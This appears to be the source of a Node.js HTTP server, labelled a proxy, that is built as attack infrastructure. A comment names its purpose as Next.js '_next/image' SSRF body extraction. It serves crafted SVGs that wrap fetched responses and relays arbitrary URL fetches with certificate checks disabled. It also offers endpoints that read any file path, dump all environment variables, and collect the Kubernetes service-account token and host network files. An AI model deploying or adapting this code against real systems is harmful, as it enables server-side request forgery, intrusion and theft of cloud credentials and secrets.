const http = require('http');
const https = require('https');
const fs = require('fs');
const PORT = process.env.PORT || 10000;

async function fetchUrl(targetUrl, timeout=8000) {
  return new Promise((resolve, reject) => {
    const mod = targetUrl.startsWith('https') ? https : http;
    const req = mod.get(targetUrl, { timeout, rejectUnauthorized: false }, (res) => {
      let data = Buffer.alloc(0);
      res.on('data', chunk => data = Buffer.concat([data, chunk]));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data.toString('utf-8') }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  
  if (url.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end('{"status":"ok"}');
  }

  // Returns a valid SVG image with arbitrary text
  // Use: /_next/image?url=https://our-proxy/svg?text=hello
  if (url.pathname === '/svg') {
    const text = url.searchParams.get('text') || 'no data';
    const lines = text.match(/.{1,80}/g) || [text];
    let textElements = lines.map((line, i) => 
      `<text x="5" y="${20 + i * 16}" font-family="monospace" font-size="12" fill="black">${line.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')}</text>`
    ).join('\n');
    const height = Math.max(100, 30 + lines.length * 16);
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="800" height="${height}">
<rect width="800" height="${height}" fill="white"/>
${textElements}
</svg>`;
    res.writeHead(200, { 'Content-Type': 'image/svg+xml', 'Content-Length': Buffer.byteLength(svg) });
    return res.end(svg);
  }

  // Fetch URL and return response as SVG image (for _next/image SSRF body extraction)
  if (url.pathname === '/imgfetch') {
    const target = url.searchParams.get('url');
    if (!target) { res.writeHead(400); return res.end('need url'); }
    try {
      const r = await fetchUrl(target);
      const body = r.body.substring(0, 4000);
      const lines = body.match(/.{1,90}/g) || [body];
      let textElements = lines.map((line, i) => 
        `<text x="5" y="${18 + i * 14}" font-family="monospace" font-size="11" fill="black">${line.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</text>`
      ).join('\n');
      const height = Math.max(100, 30 + lines.length * 14);
      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="900" height="${height}">
<rect width="900" height="${height}" fill="white"/>
<text x="5" y="${height-5}" font-size="9" fill="gray">Status: ${r.status} | Fetched: ${target}</text>
${textElements}
</svg>`;
      res.writeHead(200, { 'Content-Type': 'image/svg+xml' });
      return res.end(svg);
    } catch (e) {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="50"><text x="5" y="20" fill="red">${e.message}</text></svg>`;
      res.writeHead(200, { 'Content-Type': 'image/svg+xml' });
      return res.end(svg);
    }
  }

  if (url.pathname === '/fetch') {
    const target = url.searchParams.get('url');
    if (!target) { res.writeHead(400); return res.end('need url'); }
    try {
      const r = await fetchUrl(target);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(r));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: e.message }));
    }
  }

  if (url.pathname === '/file') {
    const path = url.searchParams.get('path');
    if (!path) { res.writeHead(400); return res.end('need path'); }
    try {
      const data = fs.readFileSync(path, 'utf-8');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      return res.end(data);
    } catch (e) {
      res.writeHead(500); return res.end(e.message);
    }
  }

  if (url.pathname === '/env') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(process.env));
  }

  if (url.pathname === '/recon') {
    const data = {};
    try { data.saToken = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token','utf-8').trim(); } catch(e) { data.saToken = e.message; }
    try { data.namespace = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace','utf-8').trim(); } catch(e) { data.namespace = e.message; }
    try { data.hosts = fs.readFileSync('/etc/hosts','utf-8'); } catch(e) { data.hosts = e.message; }
    try { data.resolv = fs.readFileSync('/etc/resolv.conf','utf-8'); } catch(e) { data.resolv = e.message; }
    data.env = process.env;
    data.uid = process.getuid();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(data));
  }

  res.writeHead(404);
  res.end('not found');
});

server.listen(PORT, () => console.log(`Proxy on :${PORT}`));
